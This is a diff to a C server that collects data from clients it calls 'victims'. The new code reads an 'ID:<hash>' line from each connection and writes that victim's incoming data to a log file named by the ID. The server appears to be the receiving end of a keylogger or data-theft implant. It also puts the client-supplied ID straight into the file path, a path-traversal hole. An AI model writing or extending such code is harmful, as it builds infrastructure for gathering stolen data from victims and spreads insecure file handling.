@@ -8,7 +8,9 @@
 #include <errno.h>
 
 #define BUF_SIZE 1024
-#define BACKLOG 2
+#define BACKLOG 23
+#define FILENAME_LEN 256
+#define VICTIM_ID_LEN 128
 
 typedef struct
 {
@@ -28,17 +30,62 @@ void init_log_directory(void)
     }
 }
 
+int read_victim_id(int sock, char *id_buf, size_t id_buf_size)
+{
+    int idx = 0; // Index counter to track the current position in the buffer
+
+    while (idx < (int)id_buf_size - 1)
+    {
+        char c;
+        int ret = recv(sock, &c, 1, 0);
+        if (ret <= 0)
+        {
+            return -1; // error or disconnect
+        }
+
+        if (c == '\n') // End of the ID message
+        {
+            id_buf[idx] = '\0'; // Replace the newline with a null terminator to finalize string
+            break;
+        }
+
+        // Append the character to the buffer
+        id_buf[idx++] = c;
+    }
+
+    // Expect format "ID:<id>"
+    if (strncmp(id_buf, "ID:", 3) == 0)
+    {
+        // Shift the string left by 3 bytes to remove the "ID:" prefix
+        // strlen(id_buf) - 2 moves the remaining characters and the '\0'
+        memmove(id_buf, id_buf + 3, strlen(id_buf) - 2); // keep only the id part
+        return 0;
+    }
+
+    return -1;
+}
+
 void *handle_client(void *arg)
 {
     client_info_t *client = (client_info_t *)arg;
     char buffer[BUF_SIZE];
-    char filename[256];
+    char filename[FILENAME_LEN];
+    char victim_id[VICTIM_ID_LEN];
     FILE *log_file;
 
     printf("(+) Client connected from %s:%d\n", client->client_ip, client->client_port);
 
-    // Unique log file name for each client (ip + port)
-    snprintf(filename, sizeof(filename), "logs/victim_%s_%d.log", client->client_ip, client->client_port);
+    // Read victim ID from client (first line: "ID:<hash>")
+    if (read_victim_id(client->socket_fd, victim_id, sizeof(victim_id)) < 0)
+    {
+        printf("(-) Failed to read victim ID from %s:%d\n", client->client_ip, client->client_port);
+        close(client->socket_fd);
+        free(client);
+        pthread_exit(NULL);
+    }
+
+    // Log file name based on victim ID, not IP/port
+    snprintf(filename, sizeof(filename), "logs/%s.log", victim_id);
 
     log_file = fopen(filename, "a");
     if (!log_file)
